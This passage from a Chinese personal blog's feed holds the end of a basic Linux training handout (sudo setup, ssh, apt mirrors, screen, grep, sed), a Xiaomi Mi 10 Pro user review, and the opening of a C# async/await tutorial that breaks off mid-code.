用户</p><h2 id="检查-wheel-用户组"><a href="#检查-wheel-用户组" class="headerlink" title="检查 wheel 用户组"></a>检查 wheel 用户组</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/<span class="keyword">group</span> | grep wheel</span><br></pre></td></tr></table></figure><p>如果没有返回则没有 wheel 用户组</p><h2 id="创建-wheel-用户组"><a href="#创建-wheel-用户组" class="headerlink" title="创建 wheel 用户组"></a>创建 wheel 用户组</h2><p>如果上一步没有 wheel 用户组，则创建一个用户组</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addgroup wheel</span><br></pre></td></tr></table></figure><h2 id="新增用户"><a href="#新增用户" class="headerlink" title="新增用户"></a>新增用户</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd superuser</span><br></pre></td></tr></table></figure><h2 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd supersu</span><br></pre></td></tr></table></figure><h2 id="切换默认编辑器"><a href="#切换默认编辑器" class="headerlink" title="切换默认编辑器"></a>切换默认编辑器</h2><p>linux 下常用的编辑器有 nano、vim、vi 等，可按照自己的需要替换默认编辑器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> EDITOR=<span class="string">&#x27;/usr/bin/vim&#x27;</span>  <span class="comment"># vim 可替换为较为简单的编辑器 nano</span></span><br><span class="line"><span class="comment"># 如：export EDITOR=&#x27;/usr/bin/nano&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="将-wheel-用户组添加到-sudoer-中"><a href="#将-wheel-用户组添加到-sudoer-中" class="headerlink" title="将 wheel 用户组添加到 sudoer 中"></a>将 wheel 用户组添加到 sudoer 中</h2><p>输入 sudo visudo</p><p>在 %admin ALL=(ALL) ALL 下方添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%wheel ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><p>如果你不慎进入 vim 编辑器不会退出的话（确信），请点击左上方的 esc 键并依次输入 :q! 后按 enter 退出，并重新进行上述的操作切换为 nano</p><h2 id="切入-superuser-用户中"><a href="#切入-superuser-用户中" class="headerlink" title="切入 superuser 用户中"></a>切入 superuser 用户中</h2><p>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su superuser</span><br></pre></td></tr></table></figure><p>并输入密码即可切换到 superuser 用户</p><h2 id="尝试使用-sudo-指令"><a href="#尝试使用-sudo-指令" class="headerlink" title="尝试使用 sudo 指令"></a>尝试使用 sudo 指令</h2><p>尝试在 superuser 中使用 sudo 指令，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure><p>看看是否有权限进行</p><h2 id="查看虚拟机的-ip-地址"><a href="#查看虚拟机的-ip-地址" class="headerlink" title="查看虚拟机的 ip 地址"></a>查看虚拟机的 ip 地址</h2><p>输入 ip addr，看除了开头为 lo 的另一个网卡（VMware Fusion 一般为 ens33）的 ip 地址</p><p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%201.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%201.png"></p><h2 id="安装-openssh"><a href="#安装-openssh" class="headerlink" title="安装 openssh"></a>安装 openssh</h2><p>可能部分同学忘记在上方勾选安装 openssh server ，在这里安装一下就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openssh -y</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> sshd</span><br><span class="line">sudo systemctl start sshd</span><br></pre></td></tr></table></figure><h2 id="尝试在实体机上连接虚拟机-ssh"><a href="#尝试在实体机上连接虚拟机-ssh" class="headerlink" title="尝试在实体机上连接虚拟机 ssh"></a>尝试在实体机上连接虚拟机 ssh</h2><p>打开 powershell 窗口</p><p>输入 ssh <a href="mailto:&#115;&#117;&#112;&#101;&#114;&#117;&#115;&#101;&#x72;&#64;&#x31;&#55;&#x32;&#46;&#x31;&#x36;&#x2e;&#x32;&#x31;&#x36;&#x2e;&#x31;&#51;&#x39;">&#115;&#117;&#112;&#101;&#114;&#117;&#115;&#101;&#x72;&#64;&#x31;&#55;&#x32;&#46;&#x31;&#x36;&#x2e;&#x32;&#x31;&#x36;&#x2e;&#x31;&#51;&#x39;</a> 并输入刚才设置的密码连接到虚拟机的 ssh</p><h2 id="创建用户目录设置权限并更改默认-shell"><a href="#创建用户目录设置权限并更改默认-shell" class="headerlink" title="创建用户目录设置权限并更改默认 shell"></a>创建用户目录设置权限并更改默认 shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /home/superuser</span><br><span class="line">sudo chown -R superuser /home/superuser</span><br><span class="line">chsh -s /bin/bash</span><br></pre></td></tr></table></figure><p>输入 exit 并重新登陆</p><h2 id="更换-apt-源"><a href="#更换-apt-源" class="headerlink" title="更换 apt 源"></a>更换 apt 源</h2><p>参考：<a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先对 sources.list 进行备份</span></span><br><span class="line">sudo mv /etc/apt/sources.list ~</span><br><span class="line"><span class="comment"># 再用自己喜欢的编辑器编辑 /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># 将上方链接中的内容复制到 ssh 中，粘贴快捷键为 shift+insert (macOS 用户: ⌘+V)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预发布软件源，不建议启用</span></span><br><span class="line"><span class="comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><h2 id="安装并使用-screen"><a href="#安装并使用-screen" class="headerlink" title="安装并使用 screen"></a>安装并使用 screen</h2><p>当你需要离开 ssh 但又要保持一些程序在后台，你就需要 screen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install screen -y</span><br></pre></td></tr></table></figure><p> 输入 screen -S example 创建一个名为 example 的 screen</p><p>在里面执行一个长时间运行的程序，如 ping 127.0.0.1</p><p>按住 ctrl，依次按下 A 和 D 暂时退出 screen</p><p>输入 screen -r example 恢复，ctrl+C 停止程序，输入 exit 关闭 screen</p><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><p>比如说查看 /etc/group 的内容，就在前面加一只猫</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure><h2 id="grep-的使用"><a href="#grep-的使用" class="headerlink" title="grep 的使用"></a>grep 的使用</h2><p>当你需要在输出中快速筛选出拥有关键词所在的行，就可以使用这个</p><p>试一试筛选出你刚才添加的 wheel 组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/group</span><br><span class="line">cat /etc/group | grep wheel</span><br></pre></td></tr></table></figure><h2 id="使用-gt-将输出写入文件之中"><a href="#使用-gt-将输出写入文件之中" class="headerlink" title="使用 &gt; 将输出写入文件之中"></a>使用 &gt; 将输出写入文件之中</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> lambda &gt; hello.txt</span><br><span class="line">cat hello.txt</span><br></pre></td></tr></table></figure><h2 id="sed-的使用"><a href="#sed-的使用" class="headerlink" title="sed 的使用"></a>sed 的使用</h2><h3 id="对于输出的直接操作"><a href="#对于输出的直接操作" class="headerlink" title="对于输出的直接操作"></a>对于输出的直接操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;awei: kksk&#x27;</span> | sed <span class="string">&#x27;s/kksk/awsl/g&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="对于文件的直接操作"><a href="#对于文件的直接操作" class="headerlink" title="对于文件的直接操作"></a>对于文件的直接操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/da/dadadadadada/g&#x27;</span> hello.txt</span><br><span class="line">cat hello.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;课前注意&quot;&gt;&lt;a href=&quot;#课前注意&quot; class=&quot;headerlink&quot; title=&quot;课前注意&quot;&gt;&lt;/a&gt;课前注意&lt;/h1&gt;&lt;p&gt;由于第一次尝试干这种活，可能干的是烂活，讲的过程中有啥问题可以直接指出&lt;/p&gt;
&lt;p&gt;本文为培训参考资料，讲 Linux 的基础操作和 WordPress 的安装，&lt;del&gt;如果路过博客的小伙伴觉得技术一般的话能不能轻点骂 QAQ&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;网安的成员可以独立完成的话可参考 &lt;a href=&quot;https://guo.moe/archives/Docker-Swarm.html&quot;&gt;https://guo.moe/archives/Docker-Swarm.html&lt;/a&gt; 尝试自行完成其他任务。&lt;/p&gt;
&lt;p&gt;开头讲的都是比较基础的内容，所以有基础的本来大概懂的学习了以后可以自己拓展一下，没有的跟着走就好了，请大家务必先把课前的内容提前安排好。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;善于使用搜索引擎&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果是安装过程中出现问题，请先尝试将你的问题在搜索引擎上寻找答案，在没有自行搜索过答案的情况下直接提问可能只会获得 &lt;a href=&quot;https://lmbtfy.cn/&quot;&gt;https://lmbtfy.cn/&lt;/a&gt; &lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="工作室" scheme="https://guo.moe/tags/%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
    <category term="培训" scheme="https://guo.moe/tags/%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>小米 10 Pro 一周体验</title>
    <link href="https://guo.moe/archives/Mi-10-Pro-Experience.html"/>
    <id>https://guo.moe/archives/Mi-10-Pro-Experience.html</id>
    <published>2020-06-26T01:00:00.000Z</published>
    <updated>2021-06-11T09:18:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前用的 iPhone 6S Plus 有点卡顿（屁都不卡，其实就是想换），正好最近 618，MIUI 好像也被捧得很高，所以就寻思着换台手机提升一下自己的体验好了。</p><span id="more"></span><h1 id="正戏"><a href="#正戏" class="headerlink" title="正戏"></a>正戏</h1><h2 id="购买"><a href="#购买" class="headerlink" title="购买"></a>购买</h2><p>这次 618 活动买小米 10 Pro有许多人选择星巴克券+北京券去京东买，但很手残的是，那几天没咋关注，天天就只记得叠蛋糕，导致没发现这事，等发现的时候车已经走了，然后就上了拼多多百亿补贴的车。12+256 的价格最终被压到 4388，我觉得还不错。PDD 牛皮！</p><p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled.png" alt="/images/Article/Mi-10-Pro-experience/Untitled.png"></p><p>在拼多多购买后 2 天发货，第三天收到商品，收到前发送 IMEI 给小米商城客服查询未激活，安心开箱。</p><p>（那 PDD 是真滴牛皮）</p><h2 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h2><p>到手解锁，老小米用户表示很赞</p><p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%201.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%201.png"></p><p>然后升级了 MIUI12 稳定版</p><p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%202.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%202.png"></p><p>不过我并没有换 rec 和 root，好像没有啥必要的模块需要安装，解锁只是为了方便以后使用钛备份转移数据而不会一解锁就清空 data 分区。</p><h2 id="使用中出现的部分问题"><a href="#使用中出现的部分问题" class="headerlink" title="使用中出现的部分问题"></a>使用中出现的部分问题</h2><p>关于这个手机的优点在其他很多视频已经提到过了，这里就提一下手机使用过程中出现的一些问题。</p><blockquote><p>以下使用体验纯主观，主要提及在作为一个不打游戏不咋拍照的我的使用下手机出现的一些问题</p></blockquote><h3 id="Wi-Fi-断流问题"><a href="#Wi-Fi-断流问题" class="headerlink" title="Wi-Fi 断流问题"></a>Wi-Fi 断流问题</h3><p>路由器设备：刷了 padavan 的 K2P &amp; Newifi 3</p><p>就最近一星期的手机体验来看，发现网上所说的断流问题在我的手机上确实存在，具体表现为使用一段时间后 bilibili、酷安等软件无法加载数据，就连访问路由器后台界面都会报 Timed out，下图为发生断流时访问路由器界面的截图。</p><p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%203.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%203.png"></p><p>但是持续时间并不长，过一会就会自己恢复，与此同时我的魅蓝 note 6 却不会出现这种状况，就很奇怪。关闭路由器上的 Clash 后该状况有所缓解，也很奇怪。</p><p>但好在切换一下 WiFi 开关就可以恢复，对于我这种不打游戏不关心持续连接的人来说问题不是很大。</p><h3 id="5G"><a href="#5G" class="headerlink" title="5G"></a>5G</h3><p> u1s1，还是之前媒体将 5G 概念吹得太过了，导致好像用了 5G 能够翻天覆地一样。但实际上使用的时候感觉和 4G 体验无差，在显示 5G 信号的时候 SIM 卡状态写的也是 4G</p><p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%204.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%204.png"></p><p>实际用处真没那么明显，<del>所以 5G 有什么用，我到手就把 5G 关了。</del></p><h3 id="充电和耗电"><a href="#充电和耗电" class="headerlink" title="充电和耗电"></a>充电和耗电</h3><p>对于在疫情期间一天到晚泡在房间里的人，其实倒是不是很关心电池的消耗问题，不过这个 4500 的电池在 MIUI12 之下似乎没有体现出来，感觉耗电有点快，在酷安上描述似乎是 MIUI12 的锅，也有人因此特意刷回 MIUI11 的。</p><p>不过充电确实很快，出门之前小小充一下能快速恢复 20% 的电量，还是很不错的。</p><p>（没图，等使用了再附</p><h3 id="小窗模式（MIUI）"><a href="#小窗模式（MIUI）" class="headerlink" title="小窗模式（MIUI）"></a>小窗模式（MIUI）</h3><p>MIUI12 的小窗模式挺好用的，特别是通知快捷回复的时候拉下来就能直接用，相较于 flyme 一个特别的优点就是在操作小窗的时候可以同时操作背后的内容，方便一键切换。</p><p>不过有一个问题，就是 MIUI12 的小窗唤出没 flyme 那么方便，可以从侧边唤出。</p><h3 id="双扬声器问题"><a href="#双扬声器问题" class="headerlink" title="双扬声器问题"></a>双扬声器问题</h3><p>关于这个，我没有细用过 MIUI11，不知道原来的扬声器效果是怎样的，只见到酷安上一片骂。对于我这种长期单扬声器用户来说，第一次打开这玩意儿播歌，反正是有点震撼的，就像是买了个喇叭一样。</p><p>不过按照酷安酷友的方法安装了 dxo 版的音质音效以后，就更震撼了，确实感觉是之前有所削减。不过我感觉还好，本来就挺 8 错的。</p><p>不过说是这么说，实际上听音乐的时候我还是喜欢拿以前华为开发者送的那个小音响来听歌，感觉这个实际体验会比较好。</p><h3 id="曲面屏"><a href="#曲面屏" class="headerlink" title="曲面屏"></a>曲面屏</h3><p>小米 10 pro 的曲面屏其实还好，没其他手机那么夸张，对于我来说刚刚好，用起来挺舒适的，认识我的人也知道我是个不怎么打游戏的人，所以对于我来说也是挺 8 错的</p><h3 id="90-Hz？"><a href="#90-Hz？" class="headerlink" title="90 Hz？"></a>90 Hz？</h3><p>说实话这个 90Hz 我每次去小米之家体验的时候真的感觉很惊艳，然后体验完回来就会感觉好爽好想买。但是实际上购买以后用不久感知不强，这个 90Hz 并不是全局 90Hz，有时候主观感觉上还会掉到 60Hz 以下。可能需要刷入全局 90Hz 来保持 90Hz 的恒定。</p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>这里就不提 小米 10 Pro 的问题了，简单聊一下其他方面的东西</p><h2 id="购买渠道？"><a href="#购买渠道？" class="headerlink" title="购买渠道？"></a>购买渠道？</h2><p>购买渠道为什么选择拼多多，因为穷</p><p>说实话，之前也想上京东的车的，但是没赶上北京券，也没赶上必胜客。</p><p>购买手机之前可以先看一下酷安之类的关于该类手机的讨论，真的可以省一大笔钱</p><p>拼多多大概认准百亿补贴的车，基本不会翻车，稳得很</p><p><del>本来是对拼多多嗤之以鼻的，但真正试了一下发现真香，i 了</del></p><h2 id="旧的-6SP？"><a href="#旧的-6SP？" class="headerlink" title="旧的 6SP？"></a>旧的 6SP？</h2><p>在不受支付宝微信在主力机的捆绑下，旧的 6sp 终于可以越狱装一些乱七八糟的插件了，有机会的话可以水一篇博文推荐一下目前备用机 6sp 正在使用的一些越狱插件，使用体验++</p><p>总的来说，感觉米 10 Pro 作为一款手机对我来说确实不错，至少买回来没有像 XPS 那样糟心，等有空我也一定要写一篇文章来痛批一下 XPS 这台玩意，用着太糟心了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前用的 iPhone 6S Plus 有点卡顿（屁都不卡，其实就是想换），正好最近 618，MIUI 好像也被捧得很高，所以就寻思着换台手机提升一下自己的体验好了。&lt;/p&gt;</summary>
    
    
    
    <category term="产品体验" scheme="https://guo.moe/categories/%E4%BA%A7%E5%93%81%E4%BD%93%E9%AA%8C/"/>
    
    <category term="小米" scheme="https://guo.moe/categories/%E4%BA%A7%E5%93%81%E4%BD%93%E9%AA%8C/%E5%B0%8F%E7%B1%B3/"/>
    
    
    <category term="MIUI" scheme="https://guo.moe/tags/MIUI/"/>
    
    <category term="Experience" scheme="https://guo.moe/tags/Experience/"/>
    
  </entry>
  
  <entry>
    <title>C# 异步编程初体验(Async/Await)</title>
    <link href="https://guo.moe/archives/CSharp-Async-Await.html"/>
    <id>https://guo.moe/archives/CSharp-Async-Await.html</id>
    <published>2020-06-04T01:00:00.000Z</published>
    <updated>2020-12-10T04:17:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-异步编程初体验-Async-Await"><a href="#C-异步编程初体验-Async-Await" class="headerlink" title="C# 异步编程初体验(Async/Await)"></a>C# 异步编程初体验(Async/Await)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直没搞懂 C# 的 async 到底是怎么玩的，一直以为和 node.js 的差不多，直到昨天问了一下 Elepover，才发现一直以来理解的 async 和 await 是错误的，于是写下一篇文章记录一下自己所想，说一下自己的初步理解，有错误之处敬请大佬指正。</p><span id="more"></span><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>一开始一直认为，只要 C# 的类型是 Task，并且标志了 async 标识符，那么函数就会异步执行。其实不是的，是否异步执行还得取决于 async 的函数内部有无 await 的标识符。</p><h2 id="错误的写法"><a href="#错误的写法" class="headerlink" title="错误的写法"></a>错误的写法</h2><p><del>我也不怕丢人</del>，首先先来给大家看一下之前写的错误写法</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ASyncProject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> test1 = TestData1();</span><br><span class="line">            <span class="keyword">var</span> test2 = TestData2();</span><br><span class="line">            Console.WriteLine(<span class="keyword">await</span> test2);</span><br><span class="line">            <span class="keyword">await</span> test1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task  <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">10000</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>&gt; <span class="title">TestData2</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">5000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;233&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面的输出结果是</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&lt;<span class="number">10</span> seconds later&gt;</span><br><span class="line">test</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br></pre></td></tr></table></figure><p>我预想的结果是</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>这显然不太对，这个不应该是异步方法吗？那这样和我直接写同步方法有什么区别呢？</p><h2 id="修改后的写法"><a href="#修改后的写法" class="headerlink" title="修改后的写法"></a>修改后的写法</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ASyncProject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> test1 = TestData1();</span><br><span class="line">            <span class="keyword">var</span> test2 = TestData2();</span><br><span class="line">            Console.WriteLine(<span class="keyword">await</span> test2);</span><br><span class="line">            <span class="keyword">await</span> test1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">10000</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>&gt; <span class="title">TestData2</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">5000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;233&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候的输出结果就和此处一样了，即</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br><span class="line">&lt;<span class="number">5</span> seconds later&gt;</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>看到这里，我想不懂的话也大概明白是什么意思了。那么，再来做个试验？</p><h2 id="async-中的同步"><a href="#async-中的同步" class="headerlink" title="async 中的同步"></a>async 中的同步</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span 